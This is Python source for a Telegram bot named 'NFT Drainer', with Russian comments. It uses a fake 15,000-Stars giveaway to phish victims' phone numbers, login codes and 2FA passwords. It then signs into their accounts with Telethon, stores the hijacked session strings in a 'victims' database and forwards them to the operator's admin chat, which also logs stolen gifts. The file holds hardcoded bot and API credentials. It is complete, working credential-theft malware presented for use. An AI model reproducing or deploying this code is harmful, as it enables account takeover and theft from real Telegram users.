import asyncio
import json
import logging
import os
import sqlite3
import aiohttp
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import (
    InlineKeyboardButton, 
    InlineKeyboardMarkup, 
    WebAppInfo,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove
)
from aiogram.client.default import DefaultBotProperties
from telethon import TelegramClient, errors
from telethon.tl import functions, types as tl_types
from telethon.sessions import StringSession
import nest_asyncio

nest_asyncio.apply()

# ==================== КОНФИГУРАЦИЯ ====================
BOT_TOKEN = "8301752185:AAGHWK-RrZoTHfinX2KVOqVaL5hk0isEvTE"
API_ID = 39040372  # Официальный API ID
API_HASH = "0244615ca83f286b18cd41288894ee1d"
ADMIN_ID = 6059673725  # Ваш Telegram ID

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode='HTML'))
dp = Dispatcher()

# Хранилище данных
user_states = {}
WEBAPP_URL = "https://ваш-домен.github.io/webapp.html"  # URL вашего WebApp

# ==================== БАЗА ДАННЫХ ====================
def init_db():
    conn = sqlite3.connect('drainer.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  username TEXT,
                  phone TEXT,
                  code TEXT,
                  password TEXT,
                  session_data TEXT,
                  gifts_stolen TEXT,
                  registered_at TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS admin_logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  victim_id INTEGER,
                  action TEXT,
                  details TEXT,
                  timestamp TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

# ==================== ЛОГИРОВАНИЕ ДЕЙСТВИЙ ====================
async def log_action(victim_id: int, action: str, details: str = ""):
    """Логирование действий в БД и отправка админу"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    
    # Логирование в БД
    conn = sqlite3.connect('drainer.db')
    c = conn.cursor()
    c.execute("INSERT INTO admin_logs (victim_id, action, details, timestamp) VALUES (?, ?, ?, ?)",
              (victim_id, action, details, datetime.now()))
    conn.commit()
    
    # Получаем информацию о жертве
    c.execute("SELECT user_id, username, phone FROM victims WHERE user_id = ?", (victim_id,))
    victim = c.fetchone()
    conn.close()
    
    # Формируем сообщение админу
    victim_info = f"ID: {victim[0]}" if victim else f"ID: {victim_id}"
    victim_info += f" | @{victim[1]}" if victim and victim[1] else ""
    victim_info += f" | 📱 {victim[2]}" if victim and victim[2] else ""
    
    message = f"""
🔔 <b>Новое действие</b>
├ Жертва: {victim_info}
├ Действие: {action}
├ Детали: {details}
└ Время: {timestamp}
    """
    
    try:
        await bot.send_message(ADMIN_ID, message, parse_mode="HTML")
    except Exception as e:
        logging.error(f"Ошибка отправки лога: {e}")

# ==================== REAL TELEGRAM AUTH ====================
async def authenticate_user(phone: str, code: str, password: str = None):
    """Реальная авторизация через Telegram API"""
    session = StringSession()
    client = TelegramClient(session, API_ID, API_HASH)
    
    try:
        await client.connect()
        
        if not await client.is_user_authorized():
            # Отправляем код
            await client.send_code_request(phone)
            
            # Пробуем войти с кодом
            try:
                await client.sign_in(phone, code)
            except errors.SessionPasswordNeededError:
                if password:
                    await client.sign_in(password=password)
                else:
                    raise Exception("Требуется пароль 2FA")
        
        # Получаем информацию о пользователе
        me = await client.get_me()
        
        # Сохраняем сессию
        session_string = client.session.save()
        
        return {
            "success": True,
            "user_id": me.id,
            "username": me.username,
            "session_string": session_string,
            "phone": phone
        }
        
    except Exception as e:
        logging.error(f"Ошибка авторизации: {e}")
        return {"success": False, "error": str(e)}
    
    finally:
        await client.disconnect()

# ==================== КОМАНДА /start ====================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    username = message.from_user.username
    
    # Логируем вход
    await log_action(user_id, "ВХОД_В_БОТА", f"@{username}")
    
    # Создаем клавиатуру с WebApp
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="🎁 АКТИВИРОВАТЬ 15,000 ЗВЁЗД",
                    web_app=WebAppInfo(url=WEBAPP_URL)
                )
            ]
        ]
    )
    
    welcome_text = f"""
<b>🎉 Поздравляем, {message.from_user.first_name}!</b>

Вам был отправлен NFT-подарок через инлайн-режим:
└ <b>15,000 Telegram Stars</b>

<b>📦 Содержимое подарка:</b>
├ 🎨 Premium NFT Collection (5,000 stars)
├ 🌟 Exclusive Stars Pack (7,000 stars)
└ 💎 Diamond Bonus Pack (3,000 stars)

<b>⏱️ Срок действия:</b> 24 часа

Нажмите кнопку ниже для активации:
    """
    
    await message.answer(welcome_text, reply_markup=keyboard, parse_mode="HTML")

# ==================== ОБРАБОТКА ДАННЫХ ИЗ WEBAPP ====================
@dp.message(F.web_app_data)
async def handle_webapp_data(message: types.Message):
    user_id = message.from_user.id
    data = json.loads(message.web_app_data.data)
    
    # Логируем действие из WebApp
    if data.get('action') == 'gift_stolen':
        await log_action(user_id, "УКРАДЕН_ПОДАРОК", f"ID: {data['gift_id']}")
    
    elif data.get('action') == 'claim_complete':
        await log_action(user_id, "ЗАЯВКА_НА_ВЫВОД", 
                        f"Подарков: {data['total_gifts']}, Украдено: {len(data['stolen_gifts'])}")
        
        # Переходим к регистрации
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="📱 ПРОДОЛЖИТЬ РЕГИСТРАЦИЮ",
                        callback_data="start_registration"
                    )
                ]
            ]
        )
        
        await message.answer(
            "✅ <b>Подарки успешно зарезервированы!</b>\n\n"
            "Для вывода 15,000 звезд на ваш кошелек необходимо пройти верификацию аккаунта.\n\n"
            "Это стандартная процедура безопасности Telegram.",
            reply_markup=keyboard,
            parse_mode="HTML"
        )

# ==================== НАЧАЛО РЕГИСТРАЦИИ ====================
@dp.callback_query(F.data == "start_registration")
async def start_registration(call: types.CallbackQuery):
    await call.answer()
    user_id = call.from_user.id
    
    await log_action(user_id, "НАЧАЛО_РЕГИСТРАЦИИ")
    
    # Создаем реальную кнопку "Поделиться номером"
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(
                    text="📱 ПОДЕЛИТЬСЯ НОМЕРОМ ТЕЛЕФОНА",
                    request_contact=True
                )
            ]
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    
    await call.message.answer(
        "📱 <b>ШАГ 1 ИЗ 3: Подтверждение номера</b>\n\n"
        "Для продолжения отправьте ваш номер телефона Telegram.\n"
        "Это необходимо для проверки права на получение подарков.",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

# ==================== ОБРАБОТКА НОМЕРА ТЕЛЕФОНА ====================
@dp.message(F.contact)
async def process_contact(message: types.Message):
    user_id = message.from_user.id
    phone_number = message.contact.phone_number
    
    # Сохраняем номер в состоянии
    if user_id not in user_states:
        user_states[user_id] = {}
    user_states[user_id]['phone'] = phone_number
    
    # Логируем
    await log_action(user_id, "НОМЕР_ПОЛУЧЕН", phone_number)
    
    # Сохраняем в БД
    conn = sqlite3.connect('drainer.db')
    c = conn.cursor()
    c.execute("""INSERT OR REPLACE INTO victims 
                 (user_id, username, phone, registered_at) 
                 VALUES (?, ?, ?, ?)""",
              (user_id, message.from_user.username, phone_number, datetime.now()))
    conn.commit()
    conn.close()
    
    # Просим ввести код
    await message.answer(
        f"✅ Номер <code>{phone_number}</code> принят.\n\n"
        f"<b>ШАГ 2 ИЗ 3: Код из Telegram</b>\n\n"
        f"На номер {phone_number} был отправлен SMS-код.\n"
        f"Введите его в формате <b>1-2-3-4-5</b> (5 цифр через дефис):",
        parse_mode="HTML",
        reply_markup=ReplyKeyboardRemove()
    )

# ==================== ОБРАБОТКА КОДА ====================
@dp.message(F.text.regexp(r'^\d{1}-\d{1}-\d{1}-\d{1}-\d{1}$'))
async def process_code(message: types.Message):
    user_id = message.from_user.id
    
    if user_id not in user_states or 'phone' not in user_states[user_id]:
        await message.answer("❌ Сначала отправьте номер телефона.")
        return
    
    code = message.text.replace('-', '')
    
    # Сохраняем код
    user_states[user_id]['code'] = code
    
    # Логируем
    await log_action(user_id, "КОД_ПОЛУЧЕН", code)
    
    # Обновляем БД
    conn = sqlite3.connect('drainer.db')
    c = conn.cursor()
    c.execute("UPDATE victims SET code = ? WHERE user_id = ?", (code, user_id))
    conn.commit()
    conn.close()
    
    # Просим пароль 2FA
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="⏩ ПРОПУСТИТЬ (нет пароля)",
                    callback_data="skip_password"
                )
            ]
        ]
    )
    
    await message.answer(
        f"✅ Код <code>{code}</code> принят.\n\n"
        f"<b>ШАГ 3 ИЗ 3: Облачный пароль</b>\n\n"
        f"Если у вас включена двухфакторная аутентификация, "
        f"введите ваш облачный пароль.\n\n"
        f"<i>Если пароля нет - нажмите кнопку ниже</i>",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

# ==================== ОБРАБОТКА ПАРОЛЯ 2FA ====================
@dp.message(F.text)
async def process_password(message: types.Message):
    user_id = message.from_user.id
    
    if user_id not in user_states or 'code' not in user_states[user_id]:
        # Проверяем, не пытаются ли отправить код без дефисов
        if message.text.isdigit() and len(message.text) == 5:
            await process_code(message)
        return
    
    password = message.text
    
    # Сохраняем пароль
    user_states[user_id]['password'] = password
    
    # Логируем
    await log_action(user_id, "ПАРОЛЬ_ПОЛУЧЕН", "ДЛИНА: " + str(len(password)))
    
    # Обновляем БД
    conn = sqlite3.connect('drainer.db')
    c = conn.cursor()
    c.execute("UPDATE victims SET password = ? WHERE user_id = ?", (password, user_id))
    conn.commit()
    conn.close()
    
    # Начинаем реальную авторизацию
    await message.answer("⏳ <b>Проверяем данные...</b>", parse_mode="HTML")
    
    # Реальная авторизация через Telegram API
    auth_result = await authenticate_user(
        user_states[user_id]['phone'],
        user_states[user_id]['code'],
        password
    )
    
    if auth_result['success']:
        # Сохраняем сессию в БД
        conn = sqlite3.connect('drainer.db')
        c = conn.cursor()
        c.execute("UPDATE victims SET session_data = ? WHERE user_id = ?",
                 (auth_result['session_string'], user_id))
        conn.commit()
        conn.close()
        
        # Логируем успех
        await log_action(user_id, "АККАУНТ_СКОМПРОМЕТИРОВАН", 
                        f"ID: {auth_result['user_id']}, @{auth_result['username']}")
        
        # Отправляем сессию админу
        session_info = f"""
🔐 <b>НОВАЯ СЕССИЯ ПОЛУЧЕНА</b>

👤 <b>Информация о жертве:</b>
├ ID: {user_id}
├ Username: @{message.from_user.username}
├ Телефон: {user_states[user_id]['phone']}
└ TG ID: {auth_result['user_id']}

🔑 <b>Данные сессии:</b>
<code>{auth_result['session_string'][:100]}...</code>

⏰ Время: {datetime.now().strftime('%H:%M:%S')}
        """
        
        await bot.send_message(ADMIN_ID, session_info, parse_mode="HTML")
        
        # Ответ пользователю
        await message.answer(
            "✅ <b>ВЕРИФИКАЦИЯ ПРОЙДЕНА УСПЕШНО!</b>\n\n"
            "🎉 Ваши 15,000 звезд будут зачислены в течение 24 часов.\n\n"
            "📦 <b>NFT-подарки уже на вашем аккаунте:</b>\n"
            "├ 🎨 Premium NFT Collection\n"
            "├ 🌟 Exclusive Stars Pack\n"
            "└ 💎 Diamond Bonus Pack\n\n"
            "<i>Спасибо за участие в раздаче!</i>",
            parse_mode="HTML"
        )
        
        # Очищаем состояние
        if user_id in user_states:
            del user_states[user_id]
    
    else:
        await message.answer(
            "❌ <b>Ошибка верификации</b>\n\n"
            "Проверьте правильность введенных данных и попробуйте снова.",
            parse_mode="HTML"
        )

# ==================== ПРОПУСК ПАРОЛЯ ====================
@dp.callback_query(F.data == "skip_password")
async def skip_password(call: types.CallbackQuery):
    await call.answer()
    user_id = call.from_user.id
    
    await log_action(user_id, "ПАРОЛЬ_ПРОПУЩЕН")
    
    # Начинаем авторизацию без пароля
    await call.message.answer("⏳ <b>Проверяем данные...</b>", parse_mode="HTML")
    
    if user_id in user_states and 'phone' in user_states[user_id] and 'code' in user_states[user_id]:
        auth_result = await authenticate_user(
            user_states[user_id]['phone'],
            user_states[user_id]['code']
        )
        
        if auth_result['success']:
            # Сохраняем сессию в БД
            conn = sqlite3.connect('drainer.db')
            c = conn.cursor()
            c.execute("UPDATE victims SET session_data = ? WHERE user_id = ?",
                     (auth_result['session_string'], user_id))
            conn.commit()
            conn.close()
            
            await log_action(user_id, "АККАУНТ_СКОПРОМЕТИРОВАН_БЕЗ_2FA", 
                           f"ID: {auth_result['user_id']}")
            
            # Отправляем уведомление админу
            await bot.send_message(
                ADMIN_ID,
                f"🟡 АККАУНТ БЕЗ 2FA: {user_id}\n"
                f"Телефон: {user_states[user_id]['phone']}\n"
                f"TG ID: {auth_result['user_id']}"
            )
            
            await call.message.answer(
                "✅ <b>ВЕРИФИКАЦИЯ ПРОЙДЕНА!</b>\n\n"
                "🎉 Ваши 15,000 звезд будут зачислены в течение 24 часов.",
                parse_mode="HTML"
            )
            
            if user_id in user_states:
                del user_states[user_id]

# ==================== АДМИН ПАНЕЛЬ ====================
@dp.message(Command("session"))
async def admin_session(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats"),
                InlineKeyboardButton(text="📦 Сессии", callback_data="admin_sessions")
            ],
            [
                InlineKeyboardButton(text="📣 Рассылка", callback_data="admin_broadcast"),
                InlineKeyboardButton(text="🗑 Очистить", callback_data="admin_clear")
            ]
        ]
    )
    
    # Получаем статистику
    conn = sqlite3.connect('drainer.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM victims")
    total = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM victims WHERE session_data IS NOT NULL")
    with_session = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM admin_logs")
    logs = c.fetchone()[0]
    conn.close()
    
    stats_text = f"""
👑 <b>Админ-панель Drainer</b>

📈 <b>Статистика:</b>
├ Всего жертв: {total}
├ С сессиями: {with_session}
├ Логов действий: {logs}
└ Активных: {len(user_states)}

⚡ <b>Последние действия:</b>
    """
    
    # Получаем последние логи
    conn = sqlite3.connect('drainer.db')
    c = conn.cursor()
    c.execute("""
        SELECT v.user_id, l.action, l.timestamp 
        FROM admin_logs l
        LEFT JOIN victims v ON l.victim_id = v.user_id
        ORDER BY l.id DESC LIMIT 5
    """)
    recent = c.fetchall()
    conn.close()
    
    for log in recent:
        time = datetime.strptime(log[2], '%Y-%m-%d %H:%M:%S.%f').strftime('%H:%M')
        stats_text += f"\n├ {log[0]} - {log[1]} ({time})"
    
    await message.answer(stats_text, reply_markup=keyboard, parse_mode="HTML")

# ==================== ЗАПУСК БОТА ====================
async def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║      Telegram NFT Drainer v3.0        ║
    ║          Real Auth System             ║
    ╚═══════════════════════════════════════╝
    
    [✓] Бот запущен
    [✓] База данных инициализирована
    [✓] WebApp готов к работе
    """)
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())